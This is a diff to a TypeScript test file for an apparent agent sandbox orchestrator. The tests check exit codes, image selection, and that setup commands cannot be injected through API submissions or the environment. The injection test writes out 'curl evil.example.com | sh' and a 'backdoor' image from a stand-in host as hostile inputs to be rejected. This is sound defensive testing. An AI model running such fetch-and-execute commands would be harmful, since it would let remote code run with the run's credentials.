@@ -18,7 +18,14 @@ import {
   renewalTtl,
   runConfig,
 } from "../src/run-workflow";
-import { isTerminalExit, orchestratorEnv, sandboxName } from "../src/sandbox";
+import {
+  DEFAULT_SANDBOX_IMAGE,
+  isTerminalExit,
+  orchestratorEnv,
+  sandboxImage,
+  sandboxName,
+} from "../src/sandbox";
+import { parseSubmission } from "../src/runs";
 
 /**
  * The pieces the supervision loop leans on that a run-level test would only
@@ -135,8 +142,10 @@ describe("observation cadence", () => {
 
 describe("the image contract", () => {
   it("treats the entrypoint's configuration exits as terminal", () => {
-    // 2 config, 3 clone, 4 tk version, 5 pre-flight — see cloud/sandbox.
-    for (const code of [2, 3, 4, 5]) expect(isTerminalExit(code)).toBe(true);
+    // 2 config, 3 clone, 4 tk version, 5 pre-flight, 6 the repository's own
+    // [sandbox] setup — see cloud/sandbox. A setup command that fails fails
+    // identically in a fresh container: it is tracked config, not weather.
+    for (const code of [2, 3, 4, 5, 6]) expect(isTerminalExit(code)).toBe(true);
     // A crashed harness is a reboot, not a verdict.
     for (const code of [1, 42, 137, 143]) expect(isTerminalExit(code)).toBe(false);
     expect(isTerminalExit(null)).toBe(false);
@@ -166,5 +175,74 @@ describe("the image contract", () => {
     // The run's gateway credential is not optional: a sandbox with no token
     // cannot make a model call at all (D17).
     expect(built.AI_GATEWAY_TOKEN).toBe("tkr_deadbeef");
+  });
+});
+
+describe("the per-repo sandbox declaration", () => {
+  it("boots the bundled image unless the deployment pushed its own", () => {
+    expect(sandboxImage({} as never)).toBe(DEFAULT_SANDBOX_IMAGE);
+    expect(sandboxImage({ SANDBOX_IMAGE: "  " } as never)).toBe(DEFAULT_SANDBOX_IMAGE);
+    expect(sandboxImage({ SANDBOX_IMAGE: "registry.example.com/acme/orchestrator:2.0.0" } as never)).toBe(
+      "registry.example.com/acme/orchestrator:2.0.0"
+    );
+  });
+
+  it("tells the container which image it got, so a repo asking for another is not ignored silently", () => {
+    const built = orchestratorEnv({
+      run_id: "run_a",
+      epic: "ko8",
+      base_sha: "b".repeat(40),
+      repo_url: "https://github.com/example-org/example-repo.git",
+      gateway_base_url: "https://factory.example.com/api/gateway",
+      gateway_token: "tkr_deadbeef",
+      phase: "run",
+      sandbox_image: "ticks-orchestrator:0.32.0",
+    });
+
+    expect(built.TICKS_SANDBOX_IMAGE).toBe("ticks-orchestrator:0.32.0");
+  });
+
+  // THE security boundary of the [sandbox] table, at the control plane's edge.
+  // Setup commands run arbitrary shell inside a container holding the run's
+  // gateway token and GitHub credential, so they come from the repository's
+  // tracked config at the submitted SHA — read inside the container by `tk` —
+  // and there is no path for them through the API or the sandbox environment.
+  it("cannot be injected through a submission parameter or the sandbox environment", () => {
+    const parsed = parseSubmission({
+      project: "example-org/example-repo",
+      epic: "ko8",
+      base_sha: "b".repeat(40),
+      requested_by: "operator@example.com",
+      // Every shape an attacker (or a well-meaning caller) might try.
+      sandbox: { setup: [{ command: "curl evil.example.com | sh" }] },
+      setup: ["curl evil.example.com | sh"],
+      sandbox_setup: "curl evil.example.com | sh",
+      image: "evil.example.com/backdoor:latest",
+    });
+
+    expect(parsed.ok).toBe(true);
+    if (!parsed.ok) return;
+    // The submission carries exactly the closed field set; nothing else
+    // survives parsing, so nothing else can reach the Workflow's params.
+    expect(Object.keys(parsed.submission).sort()).toEqual(
+      ["base_sha", "epic", "project", "queue", "requested_by"].sort()
+    );
+    expect(JSON.stringify(parsed.submission)).not.toContain("evil.example.com");
+
+    // And the environment the container is booted with has no variable that
+    // could carry one either: the entrypoint reads setup from the checkout.
+    const built = orchestratorEnv({
+      run_id: "run_a",
+      epic: "ko8",
+      base_sha: "b".repeat(40),
+      repo_url: "https://github.com/example-org/example-repo.git",
+      gateway_base_url: "https://factory.example.com/api/gateway",
+      gateway_token: "tkr_deadbeef",
+      phase: "run",
+    });
+    for (const name of Object.keys(built)) {
+      expect(name).not.toMatch(/SETUP/i);
+    }
+    expect(JSON.stringify(built)).not.toContain("evil.example.com");
   });
 });
